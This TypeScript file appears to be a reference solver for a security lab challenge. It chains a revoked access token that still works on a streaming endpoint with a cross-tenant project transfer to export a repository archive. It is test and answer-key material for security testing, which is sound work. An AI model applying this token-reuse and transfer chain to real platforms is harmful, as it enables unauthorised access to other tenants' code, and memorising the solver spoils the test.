// SF-C2 reference solver: revoked token stream -> artifact handle -> project transfer -> export.
import type { CompositeProofReceipt } from '../../../lib/types.ts'
import type { SolverContext } from './context.ts'

interface StreamFrame {
  type?: string
  artifactHandle?: string
  projectId?: string
}

function artifactFrame(stream: string): StreamFrame | null {
  for (const line of stream.split('\n')) {
    if (!line.startsWith('data: ')) continue
    try {
      const frame = JSON.parse(line.slice(6)) as StreamFrame
      if (frame.type === 'artifact.ready' && frame.artifactHandle && frame.projectId) return frame
    } catch {
      continue
    }
  }
  return null
}

export async function solveC2(ctx: SolverContext): Promise<CompositeProofReceipt | null> {
  const plan = ctx.lab.plan
  const prefix = plan.routePrefix
  await ctx.login('revoked_or_demoted')
  const dual = await ctx.login('dual_member')

  // The same revoked token is rejected by the REST surface; the stream is the exception.
  const restProbe = await ctx.http('scm', '/api/user', { token: plan.ids.revokedPatToken })
  if (restProbe.status !== 401) return null

  const stream = await ctx.http('runner', '/streams/shared', {
    token: plan.ids.revokedPatToken,
  })
  if (stream.status !== 200) return null
  const frame = artifactFrame(stream.text)
  if (!frame?.artifactHandle || !frame.projectId) return null
  const { artifactHandle, projectId } = frame

  // Clean ablation probe: a transfer is required before this actor can export the repository.
  await ctx.http('scm', `/repos/${projectId}/archive`, { token: dual })

  const transfer = await ctx.http('api', `${prefix}/projects/${projectId}/transfer`, {
    method: 'POST',
    token: dual,
    body: { destinationTenant: plan.tenants.a.slug, artifactHandle },
  })
  if (transfer.status !== 200) return null

  const exported = await ctx.http('scm', `/repos/${projectId}/archive`, { token: dual })
  if (exported.status !== 200) return null

  return ctx.confirm('SF-C2')
}
